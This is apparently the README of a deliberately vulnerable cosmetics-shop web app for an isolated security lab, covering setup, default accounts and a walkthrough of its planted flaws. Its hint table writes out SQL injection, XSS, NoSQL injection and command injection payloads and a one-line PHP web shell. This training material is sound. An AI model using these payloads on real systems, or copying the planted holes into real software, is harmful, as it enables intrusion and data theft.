# GlamVeda Cosmetics — Vulnerable Web App (Security Lab)

**FOR USE ONLY ON AN ISOLATED VM/NETWORK YOU CONTROL.**
This application contains intentional, exploitable vulnerabilities. Do not deploy it
on any shared, internet-facing, or production server. Run it on a Kali VM talking to
a local victim VM (or both services on the same Kali box) on a host-only/NAT network
with no internet exposure.

## What this is

A fictional ladies' cosmetics e-commerce site ("GlamVeda") built to practice:

- **SQL Injection** (MySQL) — login bypass, UNION-based extraction, error-based, search LIKE injection
- **NoSQL Injection** (MongoDB) — operator injection (`$ne`, `$gt`, etc.) on a separate Node.js ticket API
- **XSS** — reflected (search page) and stored (reviews, contact messages, usernames, support tickets via DOM injection)
- **IDOR** — view any user's order by changing the `id` parameter
- **Command Injection** — admin "image resizer" tool passes a filename straight into a shell command
- **Unrestricted File Upload** — avatar upload accepts any file type into a PHP-executable folder
- **CSRF** — checkout form has no anti-CSRF token

## Stack

- PHP 8 + MySQL/MariaDB (main site) — runs under Apache
- Node.js + Express + MongoDB (support ticket microservice) — runs on port 5000

## Setup on Kali Linux

```bash
chmod +x setup.sh
./setup.sh
```

This installs Apache, MariaDB, PHP, Node.js, and MongoDB (best-effort — MongoDB's
official repo isn't always in Kali's default sources, see notes below), creates and
seeds the database, deploys the PHP app to `/var/www/html/glamveda`, and configures
a vhost with `AllowOverride All` so the uploads-folder `.htaccess` PHP-execution demo
works.

Then start the ticket microservice manually (it's not a system service in this build):

```bash
cd nosql-api
node server.js
```

Visit `http://localhost/` for the main site.

### If MongoDB won't install via apt

Kali's repos don't always carry `mongodb-org`. Easiest fixes:
- Run MongoDB in a Docker container instead: `docker run -d -p 27017:27017 mongo:7`
- Or install on a separate Debian/Ubuntu VM and point `MONGO_URL` in `nosql-api/server.js` at it.

## Default accounts

| Username | Password    | Role     |
|----------|------------|----------|
| admin    | AdminP@ss123 | admin    |
| priya    | priya123     | customer |
| ananya   | ananya123    | customer |
| testuser | password     | customer |

## Vulnerability walkthrough (high level — see the full report template for detail)

| # | Vulnerability | Location | Hint |
|---|---|---|---|
| 1 | SQLi — auth bypass | `/login.php` | `admin' OR '1'='1' -- -` as username |
| 2 | SQLi — UNION extraction | `/product.php?id=` | `1 UNION SELECT 1,username,password,email,1,1,1,1 FROM users` |
| 3 | SQLi — search LIKE | `/search.php?q=` | `' UNION SELECT ...` |
| 4 | SQLi — category filter | `/products.php?category=` | `1 OR 1=1` |
| 5 | Reflected XSS | `/search.php?q=` | `<script>alert(1)</script>` |
| 6 | Stored XSS | Product review form on `/product.php` | `<script>alert(document.cookie)</script>` as a comment |
| 7 | Stored XSS | `/contact.php` message field, visible in `/admin/dashboard.php` | same payload, higher-impact target |
| 8 | Stored XSS via username | `/register.php` username field, fires on every page header once logged in | `<script>...</script>` as username |
| 9 | NoSQL Injection | `support.php` → Node API `/api/tickets/search` | `{"email":{"$ne":null},"pin":{"$ne":null}}` |
| 10 | IDOR | `/order.php?id=` | increment/decrement the id while logged in as a different user |
| 11 | Command Injection | `/admin/image_tool.php` filename field | `placeholder.png; id` |
| 12 | Unrestricted File Upload | `/profile.php` avatar upload | upload `shell.php` containing `<?php system($_GET['cmd']); ?>`, then hit `/uploads/shell.php?cmd=id` |
| 13 | CSRF | `/checkout.php` | auto-submitting form from another origin places an order as the victim |

## Suggested tools to practice with (all included in Kali)

- **sqlmap** — `sqlmap -u "http://localhost/product.php?id=1" --dbs`
- **Burp Suite** — intercept/repeat requests, test XSS and CSRF payloads
- **OWASP ZAP** — automated scan pass
- **curl / Postman** — manual NoSQLi payloads against the Node API
- **nikto** — basic web server fingerprinting

## Resetting state

Re-run `mysql -u root -proot < sql/schema.sql` to reset the MySQL data. Drop and
re-seed the Mongo `tickets` collection by restarting `server.js` after dropping the
`glamveda_support` database in `mongosh`.
